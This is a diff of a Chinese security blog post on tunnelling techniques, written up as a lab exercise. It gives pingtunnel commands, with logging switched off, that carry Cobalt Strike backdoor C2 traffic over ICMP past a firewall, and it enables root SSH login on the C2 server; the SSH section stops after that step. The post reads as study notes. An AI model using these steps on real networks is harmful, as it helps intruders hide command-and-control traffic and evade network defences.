@@ -13,7 +13,7 @@
   
   <title>
     
-      archive_a: 2024 
+      隧道技术学习 
       
       
       |
@@ -104,93 +104,187 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2024</span>
-          </h2>
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">隧道技术学习</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-08-28 00:00:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/ICMP%E9%9A%A7%E9%81%93/" title="ICMP隧道">
+                    #ICMP隧道
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/SSH%E9%9A%A7%E9%81%93/" title="SSH隧道">
+                    #SSH隧道
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="隧道技术学习"><a href="#隧道技术学习" class="headerlink" title="隧道技术学习"></a>隧道技术学习</h1><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p>
+<h2 id="常用隧道技术"><a href="#常用隧道技术" class="headerlink" title="常用隧道技术"></a>常用隧道技术</h2><p>网络层：IPv6 隧道、ICMP 隧道</p>
+<p>传输层：TCP 隧道、UDP 隧道、常规端口转发</p>
+<p>应用层：SSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</p>
+<h2 id="协议判断命令"><a href="#协议判断命令" class="headerlink" title="协议判断命令"></a>协议判断命令</h2><p>ICMP：ping ip or domain</p>
+<p>HTTP：curl ip or domain</p>
+<p>SSH：ssh  ip or domain</p>
+<p>DNS：nslookup domain</p>
+<p>TCP：telnet ip port</p>
+<h2 id="隧道应用"><a href="#隧道应用" class="headerlink" title="隧道应用"></a>隧道应用</h2><p>C2server：192.168.5.31</p>
+<p>Webserver：192.168.5.29，出网协议ICMP</p>
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>工具：cs、pingtunnel</p>
+<p>Pingtunnel is a tool that send TCP&#x2F;UDP traffic over ICMP</p>
+<p>先在C2server启动pingtunnel服务端</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -<span class="built_in">type</span> server</span><br></pre></td></tr></table></figure>
+
+<p>然后在Webserver启动客户端，这里参数：-l是本地6666端口的流量，-s是转发到192.168.5.31服务端上，-t是服务端地址和端口，-tcp是封装tcp流量为icmp</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -<span class="built_in">type</span> client -l :<span class="number">6666</span> -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">5</span>.<span class="number">31</span> -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">5</span>.<span class="number">31</span>:<span class="number">7777</span> -tcp <span class="number">1</span> -noprint <span class="number">1</span> -nolog <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这一步完成后，隧道就连接好了，下一步就是如何上线，监听端口的问题。</p>
+<p>隧道的作用是将6666端口的流量转发到C2的7777，也就是cs要监听7777端口，那回连的地址就需要是Webserver的6666端口，才会经过icmp的封装发送到C2的7777端口，所以在生成后门的时候，回连地址是：127.0.0.1:6666</p>
+<p>在cs上先添加一个对应的监听器，然后生成后门</p>
+<p><img src="/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20240828131717840.png" alt="image-20240828131717840"></p>
+<p>再添加一个C2server的7777端口监听，然后运行后门就可以上线</p>
+<p><img src="/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20240828131839103.png" alt="image-20240828131839103"></p>
+<p>在C2server上抓包看一下流量，可以看到通信流量都是ICMP协议</p>
+<p><img src="/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20240828132020930.png" alt="image-20240828132020930"></p>
+<h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><p><img src="/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20240828173930525.png" alt="image-20240828173930525"></p>
+<p>C2server：192.168.5.31</p>
+<p>webserver：192.168.5.32、192.168.2.128</p>
+<p>sqlserver：</p>
+<p>内网主机防火墙限制了出网协议，可以利用SSH转发流量实现内网穿透</p>
+<p>C2server开启ssh协议登录：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">PasswordAuthentication <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line"></span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/03/27/commons-collections6/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-08-28 00:00:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/ICMP%E9%9A%A7%E9%81%93/" title="ICMP隧道">
+                        #ICMP隧道
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/SSH%E9%9A%A7%E9%81%93/" title="SSH隧道">
+                        #SSH隧道
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
         </div>
       
-      <div class="post-item" title="隧道技术学习">
-        <div class="time-m-d">08-28</div>
-        <div class="title">
-          <a href="/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">
-            <span>隧道技术学习</span>
-          </a>
-        </div>
-      </div>
+    </div>
     
-      <div class="post-item" title="Java反序列化（CommonsCollections6）">
-        <div class="time-m-d">03-27</div>
-        <div class="title">
-          <a href="/2024/03/27/commons-collections6/">
-            <span>Java反序列化（CommonsCollections6）</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java反序列化（CommonsCollections1）">
-        <div class="time-m-d">03-22</div>
-        <div class="title">
-          <a href="/2024/03/22/commons-collections1/">
-            <span>Java反序列化（CommonsCollections1）</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java反序列化（URLDNS）">
-        <div class="time-m-d">03-15</div>
-        <div class="title">
-          <a href="/2024/03/15/urldns/">
-            <span>Java反序列化（URLDNS）</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java反序列化（一）反射">
-        <div class="time-m-d">01-08</div>
-        <div class="title">
-          <a href="/2024/01/08/%E4%BA%8C%E3%80%81%E5%8F%8D%E5%B0%84/">
-            <span>Java反序列化（一）反射</span>
-          </a>
-        </div>
-      </div>
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2023</span>
-          </h2>
-        </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
       
-      <div class="post-item" title="PolarCTF 2023冬季挑战赛">
-        <div class="time-m-d">12-09</div>
-        <div class="title">
-          <a href="/2023/12/09/PolarD&N%20ctf-wp/">
-            <span>PolarCTF 2023冬季挑战赛</span>
-          </a>
-        </div>
-      </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0"><span class="toc-text">隧道技术学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-text">常用隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD%E5%91%BD%E4%BB%A4"><span class="toc-text">协议判断命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%BA%94%E7%94%A8"><span class="toc-text">隧道应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="toc-text">ICMP隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="toc-text">SSH隧道</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      <div class="post-item" title="记录一个反序列化中利用代码逻辑绕过__wakeup()函数的方法">
-        <div class="time-m-d">11-30</div>
-        <div class="title">
-          <a href="/2023/11/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87__wakeup()%E5%87%BD%E6%95%B0/">
-            <span>记录一个反序列化中利用代码逻辑绕过__wakeup()函数的方法</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         
 <div class="footer">
@@ -447,6 +541,24 @@
 
 
         
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F08%2F28%2F%25E9%259A%25A7%25E9%2581%2593%25E6%258A%2580%25E6%259C%25AF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
   
 <script src="/js/shares.js"></script>
